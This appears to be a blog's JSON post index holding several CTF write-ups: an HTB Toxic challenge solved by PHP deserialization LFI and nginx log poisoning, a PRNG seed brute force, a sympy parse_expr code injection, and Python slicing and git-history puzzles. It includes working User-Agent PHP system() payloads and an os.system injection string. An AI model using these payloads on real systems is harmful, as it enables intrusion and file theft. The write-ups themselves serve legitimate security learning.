[ { "title": "HTB Toxic(Challenge) Writeup", "url": "/posts/HTB-TOXIC-CHALLENGE/", "categories": "writeups, HTB", "tags": "LFI, RCE, PHP", "date": "2023-02-26 00:00:00 +0000", "snippet": "web/ToxicDescription: Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸zip file *Login to Downloadindex.php&lt;?phpspl_autoload_register(function ($name){ if (preg_match('/Model$/', $name)) { $name = \"models/${name}\"; } include_once \"${name}.php\";});if (empty($_COOKIE['PHPSESSID'])){ $page = new PageModel; $page-&gt;file = '/www/index.html'; setcookie( 'PHPSESSID', base64_encode(serialize($page)), time()+60*60*24, '/' );} $cookie = base64_decode($_COOKIE['PHPSESSID']);unserialize($cookie);A few pointers to note in this file If the PHPSESSID cookie is empty, a new PageModel object is created and a file attribute is set pointing to /www/index.html. It is then serialized and base64 encoded and set in a cookie. If the PHPSESSID cookie is present, it is simply base64 decoded and unserialized. Initial StepsMy initial thoughts were to base64 decode and unserialize the cookie and change the file object to read the flag located in /flag. So I took the initial cookie and base64 decoded and unserialized it. It gave me and object which looked like this O:9:”PageModel”:1:{s:4:”file”;s:15:”/www/index.html”;}.More info about how serializing and deserializing works can be found at Insecure Deserialization in PHP. I tried to change the file to point to /flag directory, but seems like there was no flag. On looking closer at other files, there was an entrypoint.sh file.entrypoint.sh#!/bin/ash# Secure entrypointchmod 600 /entrypoint.sh# Generate random flag filenamemv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`exec \"$@\"It seems a new random directory for flag is created each time a new instance is spun. So we need to know the exact folder name to read the flag. I decided to look into other files in the folder.Analyzing nginx.confThe folder structure.├── build-docker.sh├── challenge│   ├── index.html│   ├── index.php│   ├── models│   │   └── PageModel.php│   └── static│   ├── basement│   │   └── help.png│   ├── css│   │   └── production.css│   ├── images│   │   ├── aircraft.svg│   │   ├── bucket.svg│   │   ├── dart-frog.jpg│   │   ├── drift.svg│   │   ├── facebook.svg│   │   ├── favicon.ico│   │   ├── flask.svg│   │   ├── instagram.svg│   │   ├── logo.svg│   │   ├── newrelic.svg│   │   ├── presentor.jpg│   │   ├── ryan1.png│   │   ├── ryan2.png│   │   ├── ryan3.png│   │   ├── ryan4.png│   │   ├── ryan5.png│   │   ├── ryan6.png│   │   ├── segment.svg│   │   ├── stripe.svg│   │   ├── twitter.svg│   │   ├── woman1.jpg│   │   ├── woman2.jpg│   │   ├── woman3.jpg│   │   ├── youtube.svg│   │   └── zopim.svg│   └── js│   └── production.js├── config│   ├── fpm.conf│   ├── nginx.conf│   └── supervisord.conf├── Dockerfile├── entrypoint.sh└── flagThe file that stood out was nginx.conf. I decided to give that file a look.nginx.confuser www;pid /run/nginx.pid;error_log /dev/stderr info;events { worker_connections 1024;}http { server_tokens off; log_format docker '$remote_addr $remote_user $status \"$request\" \"$http_referer\" \"$http_user_agent\" '; access_log /var/log/nginx/access.log docker; charset utf-8; keepalive_timeout 20s; sendfile on; tcp_nopush on; client_max_body_size 1M; include /etc/nginx/mime.types; server { listen 80; server_name _; index index.php; root /www; location / { try_files $uri $uri/ /index.php?$query_string; location ~ \\.php$ { try_files $uri =404; fastcgi_pass unix:/run/php-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } }}The first thing that caught my attention was the access_log, that describes where the logs were stored. Next thing is I wrote a simple PHP script that would create the PageModel object with file pointing to /var/log/nginx/access.log.&lt;?phpclass PageModel{ public $file;}$page = new PageModel;$page-&gt;file = '/var/log/nginx/access.log';print(base64_encode(serialize($page)))?&gt;After updating the cookie and refreshing the page, we are presented with the contents of access.log file. Contents of /var/log/nginx/access.logThe Final StepsNext thing we could see is how the log is formatted before it is inserted into the log file. The following line shows the configuration. log_format docker ‘$remote_addr $remote_user $status “$request” “$http_referer” “$http_user_agent” ‘; access_log /var/log/nginx/access.log docker;We could see the user agent being inserted in the log, which is something an user could control. After a few hours of research and after many attempts of trail and error, I came to know about log poisoning. Considering the application is a PHP application we could try to insert some arbitrary PHP code in the user-agent header and check if it gets executed. Inserting this line of code in the header produces the following result.&lt;?php system('ls -l /');?&gt; Contents of /var/log/nginx/access.log with contents of / folderNow since we have the flag folder we could insert another PHP payload in the user-agent header and read the flag.&lt;?php system('cat /flag_H3zzM');?&gt; Contents of /var/log/nginx/access.log with flagFlag: HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}" }, { "title": "RACTF 2022", "url": "/posts/RACTF-2022/", "categories": "writeups, RACTF 2022", "tags": "python, crypto", "date": "2022-11-20 00:00:00 +0000", "snippet": "crypto/Lightning SeedsDescription: You won’t be able to break this, we used a randomizer!python fileoutput filePython code#!/usr/bin/env python3import randomwith open('flag.txt', 'r') as f: flag = f.read()seed = random.randint(0,999)random.seed(seed)encrypted = ''.join(f'{(ord(c) ^ random.randint(0,255)):02x}' for c in flag)with open('out.txt', 'w') as f: f.write(encrypted)Output file4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227On seeing the description and the python script one can easily guess that the challenge has something to do with Pseudo Random Number Generator. The python random function is seeded with a random integer between 0 and 999, which is a very short range. So the numbers can be easily bruteforced. The challenge may have many approaches. In this writeup we’ll look into the brute force approach We’ll look into how the flag is encrypted# encrypt.pyencrypted = ''.join(f'{(ord(c) ^ random.randint(0,255)):02x}' for c in flag) Each character in flag is iterated. The unicode value of each character is xor’ed with a random number within range of 0 and 255. It is then converted to hex and joined to form the encrypted string. The 02x mentions 2 digits and hexadecimal form Decrypt using brute force approach To brute force we’ll have to do 3 steps Split the encrypted text into groups of 2 and convert them to int. Since we the flag format ie.DOCTF{.*}, we should xor the first value of the encrypted text that was converted to int with all values from 0 to 255. Next we need to find which seed value was used that gives the random int value of the previous step. The following code is for step 1 and step 2 def find_flag(): with open('out.txt.1', 'r') as f: encrypted = f.read() encrypted_split = [(encrypted[i:i+2]) for i in range(0, len(encrypted), 2)] # to split in groups of 2 integer_converted = [int(x,16) for x in encrypted_split] # to convert to integers for i in range(0,256): if(chr(integer_converted[0] ^ i) == 'D'): # to find the first random number of the sequence print(f\"seed: {i}\") The following code is for step 3 def find_seed_sequence(): for i in range(0,1000): random.seed(i) if(random.randint(0,255) == 11): # 11 was got from previous step print(f\"seed found! {i}\") # finds all possible seeds that generates 11 as the first number We get 4 possible seeds seed found! 209seed found! 231seed found! 378seed found! 876 The next step is to use the seeds to decrypt the text in out.txt def find_flag_with_seed(): with open('out.txt.1', 'r') as f: encrypted = f.read() encrypted_split = [(encrypted[i:i+2]) for i in range(0, len(encrypted), 2)] for i in [209, 231, 378, 876]: random.seed(i) # create a PRNG with custom seed decrypted_flag = ''.join(f\"{chr(int(x,16) ^ random.randint(0,255))}\" for x in encrypted_split) print(decrypted_flag) Gives the following output D&gt;wûkaok▒¯uxõµ6Û4'UÚ&amp;þ£nDn #9ÞëúcZàC°ñ3ÙªøubÔn^ÞGýØ▒D_ck±2X±`ª.ç*«éºL¡¬ÀhDOCTF{n0t_4s_r4nd0m_4s_y0u_th1nk!} Flag: DOCTF{n0t_4s_r4nd0m_4s_y0u_th1nk!}" }, { "title": "UIUCTF 2022", "url": "/posts/UIUCTF-2022/", "categories": "writeups, UIUCTF 2022", "tags": "python, pyjail", "date": "2022-08-01 00:00:00 +0000", "snippet": "rev/safepyDescription: godlike snake with a nebula behind it and math equations floating around itchallenge fileGiven python scriptfrom sympy import *def parse(expr): # learned from our mistake... let's be safe now # https://stackoverflow.com/questions/33606667/from-string-to-sympy-expression # return sympify(expr) # https://docs.sympy.org/latest/modules/parsing.html return parse_expr(expr)print('Welcome to the derivative (with respect to x) solver!')user_input = input('Your expression: ')expr = parse(user_input)deriv = diff(expr, Symbol('x'))print('The derivative of your expression is:')print(deriv)This issue in github shows the vulnerability in parse_expr.vulnerable explanationpayload:__import__(\"os\").system(\"cd / &amp;&amp; cat flag\")Output== proof-of-work: disabled ==Welcome to the derivative (with respect to x) solver!Your expression: __import__(\"os\").system(\"cd / &amp;&amp; cat flag\")uiuctf{na1v3_0r_mal1ci0u5_chang3?}The derivative of your expression is:0flag:uiuctf{na1v3_0r_mal1ci0u5_chang3?}" }, { "title": "DICE CTF@HOPE 2022", "url": "/posts/DICE-CTF-@HOPE/", "categories": "writeups, DICE CTF@HOPE 2022", "tags": "git, python, pyjail", "date": "2022-07-26 00:00:00 +0000", "snippet": "rev/slicesDescription: Have a sliceGiven python fileflag = input('Enter flag: ')def fail(): print('Wrong!') exit(-1)if len(flag) != 32: fail()if flag[:5] != 'hope{': fail()if flag[-1] != '}': fail()if flag[5::3] != 'i0_tnl3a0': fail()if flag[4::4] != '{0p0lsl': fail()if flag[3::5] != 'e0y_3l': fail()if flag[6::3] != '_vph_is_t': fail()if flag[7::3] != 'ley0sc_l}': fail()print('Congrats!')print('flag is: ', flag)Solve scriptflag = ['x' for _ in range(0,32)]flag[:5] = 'hope{'flag[-1] = '}'flag[5::3] = 'i0_tnl3a0'flag[4::4] = '{0p0lsl'flag[3::5] = 'e0y_3l'flag[6::3] = '_vph_is_t'flag[7::3] = 'ley0sc_l}'print(''.join(flag))flag:hope{i_l0ve_pyth0n_slic3s_a_l0t}misc/orphanDescription: nothing to see hereorphan.zipVisit /orphan/.git/logs0000000000000000000000000000000000000000 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang &lt;defund@users.noreply.github.com&gt; 1658084429 -0400 commit (initial): add foo0000000000000000000000000000000000000000 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang &lt;defund@users.noreply.github.com&gt; 1658084534 -0400 checkout: moving from flag to main0000000000000000000000000000000000000000 b53c9e6864ed176ea0192fd8283362a41d94906c William Wang &lt;defund@users.noreply.github.com&gt; 1658084626 -0400 commit (initial): add flagb53c9e6864ed176ea0192fd8283362a41d94906c 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang &lt;defund@users.noreply.github.com&gt; 1658084645 -0400 checkout: moving from flag to mainMove to the commit where the flag was added using git checkout -b res b53c9e6864ed176ea0192fd8283362a41d94906cflag:hope{ba9f11ecc3497d9993b933fdc2bd61e5}" } ]
